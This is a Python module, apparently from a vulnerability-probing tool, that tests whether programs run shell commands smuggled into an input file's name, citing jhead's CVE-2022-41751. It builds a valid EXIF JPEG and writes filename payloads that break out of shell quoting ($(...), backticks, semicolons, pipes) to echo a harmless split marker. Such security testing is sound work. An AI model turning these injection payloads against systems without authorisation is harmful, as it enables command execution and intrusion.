"""Command injection through the INPUT FILE'S NAME.

Some programs paste the path they were given into a shell command -- `sprintf(cmd, "mogrify ...
\\"%s\\"", FileName); system(cmd)` (jhead `-rgt`, CVE-2022-41751), a converter that shells out to
a helper, a backup tool that `system("tar ... %s")`s. The file's CONTENT is irrelevant to that
sink; its NAME is the payload. None of the input channels the injection prober had (stdin, an
argv value, a file's bytes) can carry it, because each puts the attacker's bytes somewhere other
than the name, and a fuzzer never renames its input file at all.

The probe: give the program a VALID file of the format it wants (so it reaches the code that
shells out -- jhead only regenerates a thumbnail that exists), named with a payload, under each of
the program's own flags (a sink like this is usually behind an option), and look for the payload's
effect.

THE ORACLE has to survive a program that prints the filename -- jhead echoes "in file '<name>'"
-- so "the marker is in the output" proves nothing on its own. The marker is SPLIT by an empty
shell quote (`LYK''ABC`): only a shell that EXECUTES the payload joins it into `LYKABC`; a program
echoing the name prints `LYK''ABC`. The joined form never occurs in the name, the file or the
argv, so seeing it is proof the command ran.
"""
from __future__ import annotations

import os
import shutil
import struct
import tempfile
from pathlib import Path

#: Characters a filename cannot hold (POSIX: '/' and NUL). Every payload below avoids them.
_BAD = ("/", "\x00")


def marker_parts(marker: str) -> "tuple[str, str]":
    return marker[:6], marker[6:]


def joined(marker: str) -> bytes:
    a, b = marker_parts(marker)
    return (a + b).encode()


def payloads(marker: str) -> list:
    """Filename payloads, each breaking out of a different quoting context: bare, inside "..."
    (where $(...) and `...` still expand), and inside '...'."""
    a, b = marker_parts(marker)
    m = f"{a}''{b}"
    # $(...) runs both bare and inside "..." (the usual `"%s"` in a command template); the second
    # breaks out of '...'. Two payloads per (flag, seed) keeps the sweep over a program's whole
    # option list inside an injection slice; the rest are kept for a later, wider pass.
    out = [f"x$(echo {m}>&2)", f"x';echo {m}>&2;'", f"x`echo {m}>&2`", f"x;echo {m}>&2;",
           f'x";echo {m}>&2;"', f"x|echo {m}>&2|"]
    return [p for p in out if not any(c in p for c in _BAD)]


def confirm(out: bytes, marker: str) -> bool:
    """The shell-joined marker appeared: the command in the name RAN."""
    return joined(marker) in (out or b"")


def jpeg_exif_thumbnail() -> bytes:
    """A minimal valid baseline JPEG carrying an EXIF IFD1 thumbnail placed at the END of the APP1
    segment -- the precondition a thumbnail-regenerating tool checks before it shells out."""
    le = lambda fmt, *v: struct.pack("<" + fmt, *v)      # noqa: E731
    thumb = b"\xff\xd8\xff\xd9"
    ifd0_off = 8
    ifd0 = le("H", 1) + le("HHII", 0x0112, 3, 1, 1)
    ifd1_off = ifd0_off + len(ifd0) + 4
    ifd0 += le("I", ifd1_off)
    thumb_off = ifd1_off + 2 + 2 * 12 + 4
    ifd1 = (le("H", 2) + le("HHII", 0x0201, 4, 1, thumb_off)
            + le("HHII", 0x0202, 4, 1, len(thumb)) + le("I", 0))
    app1 = b"Exif\x00\x00" + b"II*\x00" + le("I", ifd0_off) + ifd0 + ifd1 + thumb
    seg = b"\xff\xe1" + struct.pack(">H", len(app1) + 2) + app1
    dqt = b"\xff\xdb\x00\x43\x00" + bytes([1] * 64)
    sof = b"\xff\xc0\x00\x0b\x08\x00\x08\x00\x08\x01\x01\x11\x00"
    dht_dc = b"\xff\xc4\x00\x14\x00" + bytes([1] + [0] * 15) + b"\x00"
    dht_ac = b"\xff\xc4\x00\x14\x10" + bytes([1] + [0] * 15) + b"\x00"
    sos = b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00"
    return b"\xff\xd8" + seg + dqt + sof + dht_dc + dht_ac + sos + b"\x00\xff\xd9"


def seed_files(strings, given=()) -> list:
    """(bytes, extension) candidates: the operator's / the tree's own samples first, then a
    built-in valid file for each format the binary's strings name, then a plain text file."""
    out = []
    for p in given or ():
        try:
            data = Path(p).read_bytes()
            if 0 < len(data) <= 1 << 20:
                out.append((data, Path(p).suffix.lstrip(".")[:8] or "bin"))
        except OSError:
            continue
    text = " ".join(str(getattr(s, "value", s) or "") for s in (strings or ()))[:2_000_000]
    if any(k in text for k in ("Exif", "JFIF", "JPEG", "jpeg", "jpg")):
        out.append((jpeg_exif_thumbnail(), "jpg"))
    try:
        from ..fuzz import structure
        for name in structure.builtin_names():
            if name.lower() in text.lower() and len(out) < 8:
                s = structure.seed_for_name(name)
                if s:
                    out.append((s, name.lower()[:5]))
    except Exception:                                   # noqa: BLE001 -- seeds are best effort
        pass
    out.append((b"lykos sample\n", "txt"))
    seen, uniq = set(), []
    for d, e in out:
        if d not in seen:
            seen.add(d)
            uniq.append((d, e))
    return uniq[:6]


def flag_prefixes(found: dict, *, cap: int = 80) -> list:
    """argv prefixes to try: none, then each discovered flag that can stand alone. A flag taking
    a value is tried bare too -- many (jhead `-rgt[size]`) take an optional attached value."""
    out = [[]]
    for f in (found or {}).get("flags") or []:
        flag = f.get("flag") if isinstance(f, dict) else str(f)
        if flag and flag.startswith("-") and [flag] not in out:
            out.append([flag])
        if len(out) >= cap:
            break
    return out


def probe(run, strings, found, *, marker: str, given_seeds=(), deadline=None,
          workdir=None) -> "dict | None":
    """Try every (flag prefix, seed, payload name). `run(argv, cwd_dir) -> output bytes` executes
    the target (contained) with `argv`, the file sitting in `cwd_dir`. Returns the hit or None."""
    import time
    base = Path(workdir or tempfile.mkdtemp(prefix="lykos-fninj-"))
    try:
        seeds = seed_files(strings, given_seeds)
        names = payloads(marker)[:2]
        for prefix in flag_prefixes(found):
            for data, ext in seeds:
                for name in names:
                    if deadline is not None and time.monotonic() > deadline:
                        return None
                    d = base / f"s{abs(hash((tuple(prefix), ext, name))) % 10**8}"
                    d.mkdir(parents=True, exist_ok=True)
                    fname = f"{name}.{ext}"
                    path = d / fname
                    try:
                        path.write_bytes(data)
                    except OSError:
                        continue
                    out = run(list(prefix) + [str(path)], d)
                    shutil.rmtree(d, ignore_errors=True)
                    if confirm(out, marker):
                        return {"prefix": list(prefix), "name": fname, "seed": data,
                                "out": out, "marker": marker}
        return None
    finally:
        if workdir is None:
            shutil.rmtree(base, ignore_errors=True)
        else:
            os.makedirs(base, exist_ok=True)
